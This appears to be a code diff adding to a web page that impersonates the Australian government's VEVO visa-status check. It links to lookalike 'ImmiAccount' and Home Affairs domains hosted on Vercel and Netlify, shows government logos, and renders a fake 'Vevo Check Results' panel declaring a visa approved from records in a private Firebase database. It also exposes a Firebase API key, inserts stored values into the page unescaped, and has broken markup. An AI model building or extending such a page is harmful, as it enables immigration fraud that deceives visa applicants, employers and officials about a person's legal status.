@@ -227,6 +227,120 @@
 </html> 
        <div class="links-row">
       <!-- Three links — these are the three project links you asked to be used -->
+      <a class="link-item" href="https://immi-accountvisaapplications.vercel.app/" target="_blank">ImmiAccount</a>
+      <a class="link-item" href="https://immihomeaffairs-govau-visas-evisa.vercel.app/" target="_blank">skilled migration program</a>
+      <a class="link-item" href="https://agent-697dc9d8c4c--immi-apply-status-entitlement.netlify.app/" target="_blank">Immigration & Citizenship</a>
+    </div>
+
+      <footer>
+     <img src="https://uploads.onecompiler.io/445hxyxas/448nf3ak6/1000197311.png" alt="aud" width="100%" height="100%">
+     <img src="https://uploads.onecompiler.io/445hxyxas/448qj377z/1000197358.jpg" alt="aud" width="100%" height="70%">
+     <img src="https://uploads.onecompiler.io/445hxyxas/448qj377z/1000197357.jpg" alt="gov logo" width="100%" height="70%">
+     <div style="max-width:980px;margin:0 auto">
+    <div class="small">
+  </div>
+</footer>
+
+<!-- Firebase + logic -->
+<script type="module">
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
+  import { getFirestore, collection, getDocs, doc, updateDoc } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore.js";
+
+  // <-- YOUR FIREBASE CONFIG (you provided this) -->
+  const firebaseConfig = {
+    apiKey: "AIzaSyBnpyZxD7Ju7JQdNYTOnasAeiihDKS0bpI",
+    authDomain: "australian-web-9a688.firebaseapp.com",
+    databaseURL: "https://australian-web-9a688-default-rtdb.firebaseio.com",
+    projectId: "australian-web-9a688",
+    storageBucket: "australian-web-9a688.firebasestorage.app",
+    messagingSenderId: "946515883281",
+    appId: "1:946515883281:web:0837fe8a0c75e0f7ed08b0",
+    measurementId: "G-J7T070621M"
+  };
+
+  const app = initializeApp(firebaseConfig);
+  const db = getFirestore(app);
+
+  window.doSearch = async function(){
+    const grant = document.getElementById("grantNo").value.trim();
+    const res = document.getElementById("result");
+    res.innerHTML = "";
+    if(!grant){
+      res.innerHTML = `<div class="result-box"><p style="color:red">Please fill required fields and a valid Visa Grant Number.</p></div>`;
+      return;
+    }
+
+    try {
+      const snap = await getDocs(collection(db,"entries"));
+      let found = null;
+      let docId = null;
+      snap.forEach(s => { const d = s.data(); if(d.id === grant){ found = d; docId = s.id; } });
+
+      if(!found){
+        res.innerHTML = `<div class="result-box"><p style="color:#b00020">There was a problem with your request. Please try again (details not found).</p></div>`;
+        return;
+      }
+
+      // render result in VEVO style
+      let fileHtml = "";
+      if(found.link){
+        if(found.link.toLowerCase().endsWith(".pdf")){
+          fileHtml = `<iframe src="${found.link}" width="100%" height="420" style="border:1px solid #e1e8f0;margin-top:12px;border-radius:6px"></iframe>`;
+        } else if(found.link.match(/\.(jpg|jpeg|png|gif|webp)$/i)){
+          fileHtml = `<img src="${found.link}" alt="document" style="max-width:100%;margin-top:12px;border-radius:6px;border:1px solid #e1e8f0">`;
+        } else {
+          fileHtml = `<div style="margin-top:12px"><a href="${found.link}" target="_blank">Open Now  Your document Filed</a></div>`;
+        }
+      }
+
+
+      res.innerHTML = `
+        <div class="result-box">
+          <div class="tick">✔</div>
+          <h3 style="text-align:center;color:var(--nav)">Vevo Check Results</h3>
+          <p><span class="rlabel">Date provided last checked:</span> ${new Date().toISOString()}</p>
+          <p><span class="rlabel">Grant Date:</span> ${found.grantDate||''}</p>
+          <p><span class="rlabel">Expiry Date:</span> ${found.expiryDate||''}</p>
+          <p><span class="rlabel">Visa application Name:</span> ${found.title||''}</p>
+          <p><span class="rlabel">Visa Type:</span> ${found.visaClass||''}</p>
+          <p><span class="rlabel">Employer Application Details:</span> ${found.message||''}</p>
+          <p><span class="rlabel">Confirm your details:</span> ${found.work||'You have been given confirmed details including your visa category, start and end dates Visa application status has been approved.'}</p>
+          ${fileHtml}
+          <div style="text-align:center;margin-top:14px"><a href="#"><button style="background:#004aad">Back ImmiAccount Home</button></a></div>
+        </div>
+      `;
+
+      // update views count (best-effort)
+      if(docId){
+        try {
+          const ref = doc(db,"entries",docId);
+          await updateDoc(ref, { views: (found.views||0) + 1 });
+        } catch(e){ console.error("views update error",e); }
+      }
+    } catch(err){
+      console.error(err);
+      res.innerHTML = `<div class="result-box"><p style="color:red">Server error — please try again later.</p></div>`;
+    }
+  };
+
+  window.clearForm = function(){
+    ["docType","refType","fullName","dob","grantNo"].forEach(id => {
+      const el = document.getElementById(id);
+      if(el) el.value = "";
+    });
+    document.getElementById("result").innerHTML = "";
+  }
+  window.openDoc = ()=>{
+  if(!lastDoc){ alert("No document available"); return; }
+  viewer.style.display="block";
+  viewer.src = lastDoc;
+};
+</script>
+
+</body>
+</html> 
+       <div class="links-row">
+      <!-- Three links — these are the three project links you asked to be used -->
       <a class="link-item" href="https://australia-home-govt-au.netlify.app/" target="_blank">Accessibility</a>
       <a class="link-item" href="https://govt-immi-home-affairs-gov-aud-vevo.netlify.app/" target="_blank">Security | Privacy</a>
       <a class="link-item" href="https://australiaimmi-homeaffairs-gov-aud.netlify.app/" target="_blank">Copyright</a>
